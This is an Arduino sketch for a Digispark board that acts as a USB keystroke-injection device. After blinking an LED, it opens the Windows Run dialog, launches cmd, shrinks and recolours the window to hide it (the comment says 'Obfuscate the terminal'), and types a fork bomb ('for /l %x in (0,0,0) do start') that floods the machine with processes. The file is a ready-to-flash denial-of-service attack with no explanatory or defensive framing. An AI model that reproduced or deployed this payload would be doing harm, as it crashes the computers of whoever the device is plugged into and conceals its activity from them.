
#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
 
        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);

        digitalWrite(1, HIGH); 
  delay(25);          
  digitalWrite(1, LOW);  
  delay(250);




}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //Obfuscate the terminal
  DigiKeyboard.print("MODE CON: COLS=15 LINES=1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("COLOR EF");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //Run the fork bomb
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("for /l %x in (0,0,0) do start"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    
  }
}
